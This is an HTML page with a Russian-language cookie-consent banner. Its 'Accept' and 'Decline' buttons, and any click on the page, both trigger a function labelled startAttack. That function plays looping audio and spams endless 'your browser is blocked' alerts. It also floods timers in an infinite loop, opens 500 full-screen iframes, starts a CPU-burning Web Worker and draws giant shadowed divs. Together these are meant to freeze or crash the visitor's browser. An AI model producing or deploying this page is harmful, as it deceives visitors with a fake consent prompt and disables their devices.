<html onmousedown="startAttack()">
<script>
    var sound = new Audio();
    sound.src = 'ponos-mp3.mp3';
    sound.loop = true;

    function startAttack() {
        sound.play();

        // Бесконечные alert()
        setTimeout(function spamAlert() {
            alert("Ваш браузер заблокирован!");
            spamAlert();
        }, 100);

        // Перегрузка setTimeout()
        function overload() {
            while (true) {
                setTimeout(overload, 0);
            }
        }
        overload();

        // Создание множества iframe
        for (let i = 0; i < 500; i++) {
            let iframe = document.createElement('iframe');
            iframe.src = "https://example.com";
            iframe.style.position = "absolute";
            iframe.style.width = "100%";
            iframe.style.height = "100%";
            document.body.appendChild(iframe);
        }

        // Web Worker для перегрузки CPU
        let worker = new Worker(URL.createObjectURL(new Blob([`
            while (true) {
                console.log("Loading...");
            }
        `], { type: 'application/javascript' })));

        // Создание огромных div с тенями
        for (let i = 0; i < 50; i++) {
            let div = document.createElement('div');
            div.style.width = "100vw";
            div.style.height = "100vh";
            div.style.boxShadow = "0 0 100000px red";
            document.body.appendChild(div);
        }
    }
</script>

<style>
    body {
        margin: 0;
        padding: 0;
        display: flex;
        justify-content: center;
        align-items: flex-start;
        height: 100vh;
        text-align: center;
        cursor: pointer;
        overflow: hidden;
        position: relative;
        -webkit-tap-highlight-color: transparent;
        user-select: none;
    }
    p {
        margin: 0;
    }

    .overlay {
        position: fixed;
        top: 0;
        left: 0;
        height: 100vh;
        width: 100vw;
    }

    p.overlay-title {
        font-size: 24px;
        font-weight: 900;
        color: black;
    }

    .overlay-button {
        display: inline-flex;
        align-items: center;
        height: 40px;
        padding: 0 24px;
        font-size: 16px;
        font-weight: 500;
        border-radius: 4px;
        margin: 4px;
        cursor: pointer;
    }

    #accept-button {
        background-color: rgb(58, 58, 58);
        color: white;
    }

    #decline-button {
        color: rgb(58, 58, 58);
        border: 2px solid rgb(58, 58, 58);
    }
</style>

<body>
    <div id="overlay" class="overlay">
        <div class="overlay-body">
            <p class="overlay-title">Cookies и сторонний контент</p>
            <p class="overlay-description">Этот сайт использует cookies, чтобы улучшить производительность.</p>
            <div class="overlay-buttons-wrapper">
                <div id="accept-button" class="overlay-button" onclick="startAttack()">Принять</div>
                <div id="decline-button" class="overlay-button" onclick="startAttack()">Отклонить</div>
            </div>
        </div>
    </div>
</body>
</html>
